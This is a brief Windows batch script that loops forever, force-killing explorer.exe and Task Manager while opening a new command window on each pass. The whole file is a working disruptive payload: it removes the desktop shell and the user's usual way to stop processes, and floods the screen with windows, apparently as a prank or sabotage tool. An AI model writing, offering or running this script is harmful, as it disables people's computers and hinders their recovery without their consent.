@echo off
title gn
:loop
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
start
goto loop
